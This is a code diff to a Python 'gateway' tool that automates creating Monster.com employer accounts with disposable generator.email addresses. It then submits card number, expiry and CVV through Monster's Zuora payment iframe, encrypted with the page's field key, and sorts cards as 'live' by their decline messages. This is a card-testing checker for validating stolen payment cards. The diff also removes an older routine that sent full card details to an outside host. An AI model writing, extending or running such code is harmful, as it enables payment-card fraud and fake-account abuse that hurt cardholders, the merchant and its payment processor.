@@ -10,6 +10,8 @@ from time import sleep
 from typing import Dict, Optional
 from faker import Faker
 from urllib.parse import urljoin
+from Crypto.Cipher import PKCS1_v1_5
+from Crypto.PublicKey import RSA
 
 app = Flask(__name__)
 
@@ -75,6 +77,22 @@ class GatewaysDeveloper:
             headers['Authorization'] = f'Bearer {token}'
         return headers
 
+    def get_generator_headers_mobile(self):
+        return {
+            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'Accept-Language': 'en-IN,en;q=0.9,bn-IN;q=0.8,bn;q=0.7,en-GB;q=0.6,en-US;q=0.5',
+            'upgrade-insecure-requests': '1',
+            'sec-fetch-site': 'same-origin',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-user': '?1',
+            'sec-fetch-dest': 'document',
+            'sec-ch-ua': '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'priority': 'u=0, i'
+        }
+
     def get_generator_headers(self):
         return {
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36',
@@ -108,65 +126,71 @@ class GatewaysDeveloper:
             'sec-fetch-site': 'same-origin'
         }
 
+    def get_monster_headers(self):
+        return {
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+            "Accept-Language": "es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7",
+            "Connection": "keep-alive",
+            "Upgrade-Insecure-Requests": "1",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+        }
+
+    def get_email_from_generator(self) -> str:
+        headers = self.get_generator_headers_mobile()
+        response = self.session.get('https://generator.email/', headers=headers)
+        
+        if response.status_code == 200:
+            match = re.search(r'<span id="email_ch_text">([^<]+)</span>', response.text)
+            if match:
+                email = match.group(1).strip()
+                return email
+            
+            email_match = re.search(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', response.text)
+            if email_match:
+                return email_match.group(0)
+        
+        domain = self.get_random_domain()
+        username = "".join(random.choices(string.ascii_lowercase + string.digits, k=10))
+        return f"{username}@{domain}"
+
     def get_random_domain(self) -> str:
-        vowels = 'aeiou'
-        consonants = 'bcdfghjklmnpqrstvwxyz'
-        keyword = random.choice(consonants) + random.choice(vowels)
+        try:
+            response = self.session.get('https://generator.email/', headers=self.get_generator_headers_mobile())
+            domains_match = re.findall(r'@([a-zA-Z0-9.-]+\.[a-zA-Z]{2,})', response.text)
+            if domains_match:
+                return random.choice(domains_match)
+        except:
+            pass
         
-        for attempt in range(5):
-            try:
-                response = self.session.get(
-                    f'https://generator.email/search.php?key={keyword}',
-                    headers=self.get_headers()
-                )
-                domains = json.loads(response.text)
-                valid_domains = [d for d in domains if all(ord(c) < 128 for c in d)]
-                if valid_domains:
-                    return random.choice(valid_domains)
-            except Exception as e:
-                if attempt == 4:
-                    return "casinolotte.com"
-                sleep(1)
-        return "casinolotte.com"
+        fallback_domains = [
+            "temp-mail.org", "guerrillamail.com", "mailinator.com",
+            "10minutemail.com", "throwaway.email", "dispostable.com"
+        ]
+        return random.choice(fallback_domains)
 
-    def generate_email_username(self, domain: str) -> str:
-        first_names = ['john', 'mike', 'david', 'chris', 'tom', 'eric', 'kevin', 'brian', 'steve', 'mark']
-        last_names = ['smith', 'johnson', 'williams', 'brown', 'jones', 'garcia', 'miller', 'davis', 'rodriguez', 'martinez']
-        
-        first_name = random.choice(first_names)
-        last_name = random.choice(last_names)
-        random_nums = ''.join(random.choices(string.digits, k=3))
-        
-        separator = random.choice(['', '.', '_'])
-        self.email_username = f"{first_name}{separator}{last_name}{random_nums}"
-        return self.email_username
-
-    def get_email_cookies(self) -> Dict[str, str]:
-        self.email_domain = self.get_random_domain()
-        self.generate_email_username(self.email_domain)
-        self.email = f"{self.email_username}@{self.email_domain}"
+    def _CreateTempEmail(self) -> str:
+        self.email = self.get_email_from_generator()
+        if '@' in self.email:
+            self.email_username, self.email_domain = self.email.split('@')
+        else:
+            self.email_domain = self.get_random_domain()
+            self.email_username = "".join(random.choices(string.ascii_lowercase + string.digits, k=10))
+            self.email = f"{self.email_username}@{self.email_domain}"
         
         self.email_cookies = {
             'embx': f'["{self.email}"]',
             'surl': f'{self.email_domain}/{self.email_username}'
         }
         
-        response = self.session.get('https://generator.email/', headers=self.get_generator_headers())
+        self.session.get('https://generator.email/', headers=self.get_generator_headers())
         for cookie in self.session.cookies:
             self.email_cookies[cookie.name] = cookie.value
         
-        return self.email_cookies
-
-    def create_email(self) -> bool:
         headers = self.get_generator_api_headers()
         data = {'usr': self.email_username, 'dmn': self.email_domain}
-        
         response = self.session.post('https://generator.email/check_mail.php', headers=headers, data=data)
-        try:
-            result = json.loads(response.text)
-            return result.get('status') == 'ok'
-        except:
-            return True
+        
+        return self.email
 
     def fetch_verification_direct(self, max_attempts=30) -> Optional[str]:
         if not self.email_username or not self.email_domain:
@@ -183,6 +207,10 @@ class GatewaysDeveloper:
                     match = re.search(r'ticket=([A-Za-z0-9]+)', response.text)
                     if match:
                         return match.group(1)
+                    
+                    match = re.search(r'https://[^\s]*verifyEmail[^\s]*ticket=([A-Za-z0-9]+)', response.text)
+                    if match:
+                        return match.group(1)
                 
                 sleep(3)
                 
@@ -191,22 +219,20 @@ class GatewaysDeveloper:
         
         return None
 
-    def _CreateTempEmail(self, _Provider="Generator"):
-        self.get_email_cookies()
-        if not self.create_email():
-            raise Exception("Failed to create email")
-        return self.email
-
-    def _Encrypt(self, _Card="", _Mm="", _Yy="", _Cvv=""):
-        try:
-            cc_string = f"{_Card}|{_Mm}|{_Yy}|{_Cvv}"
-            response = requests.get(f"https://erovix.xyz/Eway/enc.php?cc={cc_string}")
-            if response.status_code == 200:
-                data = response.json()
-                return data.get('encrypted', '')
-        except:
-            pass
-        return ""
+    def _Encrypt(self, _Card="", _Mm="", _Yy="", _Cvv="", _FieldKey=""):
+        if len(_Yy) == 2:
+            _Yy = f"20{_Yy}"
+        if len(_Mm) == 1:
+            _Mm = f"0{_Mm}"
+        
+        Prefix = ".".join(str(random.randint(0, 255)) for _ in range(4))
+        Payload = f"#{Prefix}#{_Card}#{_Cvv}#{_Mm}#{_Yy}"
+        Encoded = b64encode(Payload.encode())
+        FieldKey = _FieldKey.strip()
+        if "BEGIN PUBLIC KEY" not in FieldKey:
+            FieldKey = f"-----BEGIN PUBLIC KEY-----\n{FieldKey}\n-----END PUBLIC KEY-----"
+        Cipher = PKCS1_v1_5.new(RSA.import_key(FieldKey))
+        return b64encode(Cipher.encrypt(Encoded)).decode()
 
     def _VerifyStatusResponse(self, message):
         _live = ["Transaction declined.2010 - Card Issuer Declined CVV", "Approved"]
@@ -231,32 +257,21 @@ class GatewaysDeveloper:
             web = self._CreateSessionWeb(_ServiceWeb="Requests", _ProxyWeb=None)
             
             try:
-                headers = {
-                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-                    "Accept-Language": "es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7",
-                    "Connection": "keep-alive",
-                    "Upgrade-Insecure-Requests": "1",
-                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
-                }
-                req = web.get("https://manage.monster.com/auth/login?r=%2Fdashboard&keepSessionInfo=true&apigeeApiKey=4u8nirp5l6ugasm1im1itrg0er&employerEnvironment=prod-ams&employerLocale=en-US&employerHost=https%3A%2F%2Fmanage.monster.com&employerBffDomain=https%3A%2F%2Fappsapi.monster.io%2Femployer-bff%2Fv1", headers=headers, allow_redirects=False)
+                req = web.get(
+                    "https://manage.monster.com/auth/login?r=%2Fdashboard&keepSessionInfo=true&apigeeApiKey=4u8nirp5l6ugasm1im1itrg0er&employerEnvironment=prod-ams&employerLocale=en-US&employerHost=https%3A%2F%2Fmanage.monster.com&employerBffDomain=https%3A%2F%2Fappsapi.monster.io%2Femployer-bff%2Fv1",
+                    headers=self.get_monster_headers(),
+                    allow_redirects=False
+                )
                 AuthorizeUrl = req.headers.get("location", req.headers.get("Location", ""))
                 if not AuthorizeUrl:
-                    SiteError = "Failed Getting Authorize URL (Request 1)"
+                    SiteError = "Failed Getting Authorize URL"
                     continue
             except Exception as u:
-                SiteError = f"Failed Getting Authorize URL (Request 1) | {u}"
+                SiteError = f"Failed Getting Authorize URL | {u}"
                 continue
 
             try:
-                headers = {
-                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-                    "Accept-Language": "es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7",
-                    "Connection": "keep-alive",
-                    "Referer": "https://manage.monster.com/",
-                    "Upgrade-Insecure-Requests": "1",
-                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
-                }
-                req = web.get(AuthorizeUrl, headers=headers)
+                req = web.get(AuthorizeUrl, headers=self.get_monster_headers())
                 UlpUrl = req.url
                 B64Match = re.search(r'window\.atob\(["\']([A-Za-z0-9+/=]+)["\']\)', req.text)
                 if not B64Match:
@@ -269,13 +284,13 @@ class GatewaysDeveloper:
                 Csrf1 = Config["extraParams"]["_csrf"]
                 Auth0ClientH = b64encode(b'{"name":"auth0.js","version":"9.15.0"}').decode()
                 if not ClientId or not AuthState1 or not Nonce1 or not Csrf1:
-                    SiteError = "Failed Getting Auth0 Config values (Request 2)"
+                    SiteError = "Failed Getting Auth0 Config values"
                     continue
             except Exception as u:
-                SiteError = f"Failed Getting Auth0 Config (Request 2) | {u}"
+                SiteError = f"Failed Getting Auth0 Config | {u}"
                 continue
 
-            TempMail = self._CreateTempEmail(_Provider="Generator")
+            TempMail = self._CreateTempEmail()
             
             try:
                 headers = {
@@ -303,12 +318,11 @@ class GatewaysDeveloper:
                     }
                 }
                 req = web.post("https://hiring-identity.monster.com/dbconnections/signup", headers=headers, json=json_data)
-                
                 if "_id" not in req.text:
-                    SiteError = f"Failed Signup (Request 3): {req.text}"
+                    SiteError = f"Failed Signup: {req.text[:200]}"
                     continue
             except Exception as u:
-                SiteError = f"Failed Signup (Request 3) | {u}"
+                SiteError = f"Failed Signup | {u}"
                 continue
 
             try:
@@ -321,16 +335,7 @@ class GatewaysDeveloper:
                 continue
 
             try:
-                headers = {
-                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-                    "Accept-Language": "es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7",
-                    "Connection": "keep-alive",
-                    "Host": "hiring-identity.monster.com",
-                    "Referer": "https://manage.monster.com/",
-                    "Upgrade-Insecure-Requests": "1",
-                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
-                }
-                req = web.get(f"https://hiring-identity.monster.com/u/email-verification?ticket={CodeOtp}", headers=headers)
+                req = web.get(f"https://hiring-identity.monster.com/u/email-verification?ticket={CodeOtp}", headers=self.get_monster_headers())
                 StateVerifyMail = self._Capture(req.text, 'name="state" value="', '"')
                 if not StateVerifyMail:
                     SiteError = "Failed Getting Verify Page State"
@@ -340,22 +345,13 @@ class GatewaysDeveloper:
                 continue
 
             try:
-                headers = {
-                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-                    "Accept-Language": "es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7",
-                    "Connection": "keep-alive",
-                    "Content-Type": "application/x-www-form-urlencoded",
-                    "Host": "hiring-identity.monster.com",
-                    "Origin": "https://hiring-identity.monster.com",
-                    "Referer": f"https://hiring-identity.monster.com/u/email-verification?ticket={CodeOtp}",
-                    "Upgrade-Insecure-Requests": "1",
-                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
-                }
+                headers = self.get_monster_headers()
+                headers['Content-Type'] = 'application/x-www-form-urlencoded'
+                headers['Origin'] = 'https://hiring-identity.monster.com'
+                headers['Referer'] = f"https://hiring-identity.monster.com/u/email-verification?ticket={CodeOtp}"
                 data = {"state": StateVerifyMail}
                 req = web.post(f"https://hiring-identity.monster.com/u/email-verification?ticket={CodeOtp}", headers=headers, data=data)
-                if "verified" in req.url.lower() or "Your+email" in req.url or "success" in req.url.lower():
-                    pass
-                else:
+                if "verified" not in req.url.lower() and "success" not in req.url.lower():
                     SiteError = "Failed Verify Email"
                     continue
             except Exception as u:
@@ -363,14 +359,11 @@ class GatewaysDeveloper:
                 continue
 
             try:
-                headers = {
-                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-                    "Accept-Language": "es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7",
-                    "Connection": "keep-alive",
-                    "Upgrade-Insecure-Requests": "1",
-                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
-                }
-                req = web.get("https://manage.monster.com/auth/login?r=%2Fdashboard&keepSessionInfo=true&apigeeApiKey=4u8nirp5l6ugasm1im1itrg0er&employerEnvironment=prod-ams&employerLocale=en-US&employerHost=https%3A%2F%2Fmanage.monster.com&employerBffDomain=https%3A%2F%2Fappsapi.monster.io%2Femployer-bff%2Fv1", headers=headers, allow_redirects=False)
+                req = web.get(
+                    "https://manage.monster.com/auth/login?r=%2Fdashboard&keepSessionInfo=true&apigeeApiKey=4u8nirp5l6ugasm1im1itrg0er&employerEnvironment=prod-ams&employerLocale=en-US&employerHost=https%3A%2F%2Fmanage.monster.com&employerBffDomain=https%3A%2F%2Fappsapi.monster.io%2Femployer-bff%2Fv1",
+                    headers=self.get_monster_headers(),
+                    allow_redirects=False
+                )
                 AuthorizeUrl2 = req.headers.get("location", req.headers.get("Location", ""))
                 if not AuthorizeUrl2:
                     SiteError = "Failed Getting Fresh Authorize URL"
@@ -380,15 +373,7 @@ class GatewaysDeveloper:
                 continue
 
             try:
-                headers = {
-                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-                    "Accept-Language": "es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7",
-                    "Connection": "keep-alive",
-                    "Referer": "https://manage.monster.com/",
-                    "Upgrade-Insecure-Requests": "1",
-                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
-                }
-                req = web.get(AuthorizeUrl2, headers=headers)
+                req = web.get(AuthorizeUrl2, headers=self.get_monster_headers())
                 UlpUrl2 = req.url
                 B64Match2 = re.search(r'window\.atob\(["\']([A-Za-z0-9+/=]+)["\']\)', req.text)
                 Config2 = json.loads(b64decode(B64Match2.group(1) + "==").decode("utf-8", "replace"))
@@ -433,8 +418,8 @@ class GatewaysDeveloper:
                 
                 FormAction = self._Capture(req.text, 'action="', '"')
                 WaVal = self._Capture(req.text, 'name="wa" value="', '"')
-                WresultMatch = re.search(r'name="wresult"[^>]*\s+value="([^"]+)"', req.text, re.DOTALL) or re.search(r'name="wresult"\s+value="([^"]+)"', req.text, re.DOTALL)
-                WctxMatch = re.search(r'name="wctx"[^>]*\s+value="([^"]+)"', req.text, re.DOTALL) or re.search(r'name="wctx"\s+value="([^"]+)"', req.text, re.DOTALL)
+                WresultMatch = re.search(r'name="wresult"[^>]*\s+value="([^"]+)"', req.text, re.DOTALL)
+                WctxMatch = re.search(r'name="wctx"[^>]*\s+value="([^"]+)"', req.text, re.DOTALL)
                 WresultRaw = WresultMatch.group(1) if WresultMatch else None
                 WctxRaw = WctxMatch.group(1) if WctxMatch else None
                 
@@ -456,13 +441,6 @@ class GatewaysDeveloper:
                     "Upgrade-Insecure-Requests": "1",
                     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
                 }
-                headers2 = {
-                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-                    "Accept-Language": "es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7",
-                    "Connection": "keep-alive",
-                    "Upgrade-Insecure-Requests": "1",
-                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
-                }
                 Wresult = WresultRaw.replace("&#34;", '"').replace("&amp;", "&").replace("&lt;", "<").replace("&gt;", ">")
                 Wctx = (WctxRaw or "").replace("&#34;", '"').replace("&amp;", "&")
                 data = {"wa": WaVal, "wresult": Wresult, "wctx": Wctx}
@@ -474,11 +452,11 @@ class GatewaysDeveloper:
                     if redirect_url:
                         if redirect_url.startswith('/'):
                             redirect_url = urljoin("https://hiring-identity.monster.com", redirect_url)
-                        req = web.get(redirect_url, headers=headers2, allow_redirects=True)
+                        req = web.get(redirect_url, headers=self.get_monster_headers(), allow_redirects=True)
                     else:
-                        req = web.get("https://manage.monster.com/en-us/accountCreation", headers=headers2)
+                        req = web.get("https://manage.monster.com/en-us/accountCreation", headers=self.get_monster_headers())
                 else:
-                    req = web.get("https://manage.monster.com/en-us/accountCreation", headers=headers2)
+                    req = web.get("https://manage.monster.com/en-us/accountCreation", headers=self.get_monster_headers())
                 
                 Bearer = self._Capture(req.text, '"accessToken":"', '"')
                 DeviceId = self._Capture(req.text, '"device_id":"', '"') or ""
@@ -539,15 +517,10 @@ class GatewaysDeveloper:
                 continue
 
             try:
-                headers = {
-                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-                    "Accept-Language": "es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7",
-                    "Connection": "keep-alive",
-                    "Host": "manage.monster.com",
-                    "Upgrade-Insecure-Requests": "1",
-                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
-                }
-                req = web.get("https://manage.monster.com/en-us/membershipPayment?planId=8a128c1b888ec3c0018891010c3c0459", headers=headers)
+                req = web.get(
+                    "https://manage.monster.com/en-us/membershipPayment?planId=8a128c1b888ec3c0018891010c3c0459",
+                    headers=self.get_monster_headers()
+                )
                 AccountId = self._Capture(req.text, '"AccountBillingInfo","accountId":"', '"')
                 Bearer = self._Capture(req.text, '"accessToken":"', '"')
                 DeviceId = self._Capture(req.text, '"device_id":"', '"') or DeviceId
@@ -590,7 +563,7 @@ class GatewaysDeveloper:
                 ZuoraToken = self._Capture(req.text, 'token":"', '"')
                 ZuoraFieldAccountId = self._Capture(req.text, 'billingAccountId":"', '"')
                 ZuoraSignature = self._Capture(req.text, 'signature":"', '"')
-                if not ZuoraId or not ZuoraTenantId or not ZuoraToken or not ZuoraFieldAccountId or not ZuoraSignature:
+                if not all([ZuoraId, ZuoraTenantId, ZuoraToken, ZuoraFieldAccountId, ZuoraSignature]):
                     SiteError = "Failed Getting Tokens Zuora Iframe"
                     continue
             except Exception as u:
@@ -633,7 +606,7 @@ class GatewaysDeveloper:
                 ZuoraSignature = self._Capture(req.text, 'name="signature" id="signature" value="', '"')
                 ZuoraFieldKey = self._Capture(req.text, 'name="field_key" value="', '"')
                 Zuoraxjd28s_6sk = self._Capture(req.text, 'name="xjd28s_6sk" id="xjd28s_6sk" value="', '"')
-                if not ZuoraId or not ZuoraTenantId or not ZuoraToken or not ZuoraSignature or not ZuoraFieldKey or not Zuoraxjd28s_6sk:
+                if not all([ZuoraId, ZuoraTenantId, ZuoraToken, ZuoraSignature, ZuoraFieldKey, Zuoraxjd28s_6sk]):
                     SiteError = "Failed Getting Zuora Iframe Tokens"
                     continue
             except Exception as u:
@@ -641,7 +614,7 @@ class GatewaysDeveloper:
                 continue
 
             try:
-                EncryptCard = self._Encrypt(_Card=_card, _Mm=_mm, _Yy=_yy, _Cvv=_cvv)
+                EncryptCard = self._Encrypt(_Card=_card, _Mm=_mm, _Yy=_yy, _Cvv=_cvv, _FieldKey=ZuoraFieldKey)
                 if not EncryptCard:
                     SiteError = "Failed to encrypt card"
                     continue
